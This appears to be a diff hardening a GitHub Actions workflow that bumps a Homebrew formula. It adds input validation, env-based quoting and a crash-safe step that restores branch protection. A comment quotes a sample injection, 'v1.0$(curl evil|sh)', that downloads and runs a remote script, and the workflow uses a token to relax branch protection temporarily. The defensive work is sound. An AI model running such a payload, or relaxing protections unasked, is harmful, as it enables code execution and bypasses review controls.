@@ -11,6 +11,11 @@ on:
 permissions:
   contents: write
 
+# two overlapping bumps would race the protection relax/push/restore dance
+concurrency:
+  group: brew-bump
+  cancel-in-progress: false
+
 jobs:
   bump:
     runs-on: ubuntu-latest
@@ -20,21 +25,35 @@ jobs:
           ref: main
       - name: get version
         id: v
+        env:
+          WANT: ${{ inputs.version }}
         run: |
-          if [ "${{ inputs.version }}" != "" ]; then
-            echo "version=${{ inputs.version }}" >> $GITHUB_OUTPUT
+          if [ -n "$WANT" ]; then
+            raw="$WANT"
           else
-            echo "version=${GITHUB_REF#refs/tags/v}" >> $GITHUB_OUTPUT
+            raw="${GITHUB_REF#refs/tags/v}"
           fi
+          # a tag or dispatch input like v1.0$(curl evil|sh) must never
+          # reach a run block or the formula
+          case "$raw" in
+            *[!0-9.]*) echo "invalid version: $raw" >&2; exit 1;;
+          esac
+          echo "version=$raw" >> $GITHUB_OUTPUT
       - name: bump formula sha
-        run: ./scripts/bump-brew.sh ${{ steps.v.outputs.version }}
+        env:
+          VERSION: ${{ steps.v.outputs.version }}
+        run: ./scripts/bump-brew.sh "$VERSION"
       - name: commit bump
         # main requires three status checks. GITHUB_TOKEN cannot touch
         # protection settings, so a maintainer PAT secret (BREW_PUSH_TOKEN)
         # relaxes → pushes → restores. Without the secret this work is a
         # local job only, matching the maintainer's terminal dance there.
+        # the restore lives in its own always() step: a failed push used to
+        # kill this step under bash -e and leave main unprotected forever.
+        id: push
         env:
           PUSH_TOKEN: ${{ secrets.BREW_PUSH_TOKEN }}
+          VERSION: ${{ steps.v.outputs.version }}
         run: |
           if git diff --quiet; then
             echo "no changes"
@@ -44,8 +63,9 @@ jobs:
           git config user.name "github-actions"
           git config user.email "actions@github.com"
           git add Formula/agent-harness.rb
-          git commit -m "bump brew to v${{ steps.v.outputs.version }}"
+          git commit -m "bump brew to v$VERSION"
           if [ -n "$PUSH_TOKEN" ]; then
+            echo "relaxed=true" >> "$GITHUB_OUTPUT"
             curl -sS -o /dev/null \
               -X PUT ${GITHUB_API_URL}/repos/${{ github.repository }}/branches/main/protection \
               -H "Authorization: Bearer $PUSH_TOKEN" \
@@ -53,12 +73,19 @@ jobs:
               -d '{"required_status_checks": null, "enforce_admins": true, "restrictions": null, "required_pull_request_reviews": null}'
           fi
           git push "https://x-access-token:$TOKEN@github.com/${{ github.repository }}.git" main
-          R=$?
-          if [ -n "$PUSH_TOKEN" ]; then
-            curl -sS -o /dev/null \
-              -X PUT ${GITHUB_API_URL}/repos/${{ github.repository }}/branches/main/protection \
-              -H "Authorization: Bearer $PUSH_TOKEN" \
-              -H "Accept: application/vnd.github+json" \
-              -d '{"required_status_checks": {"strict": true, "contexts": ["doctor", "security", "audit"]}, "enforce_admins": true, "restrictions": null, "required_pull_request_reviews": null}'
+      - name: restore branch protection
+        if: always()
+        env:
+          PUSH_TOKEN: ${{ secrets.BREW_PUSH_TOKEN }}
+          RELAXED: ${{ steps.push.outputs.relaxed }}
+        run: |
+          # crash-safe: runs even when the push failed or the job was cancelled
+          if [ "$RELAXED" != "true" ]; then
+            echo "protection never relaxed"
+            exit 0
           fi
-          exit $R
+          curl -sS -o /dev/null \
+            -X PUT ${GITHUB_API_URL}/repos/${{ github.repository }}/branches/main/protection \
+            -H "Authorization: Bearer $PUSH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -d '{"required_status_checks": {"strict": true, "contexts": ["doctor", "security", "audit"]}, "enforce_admins": true, "restrictions": null, "required_pull_request_reviews": null}'
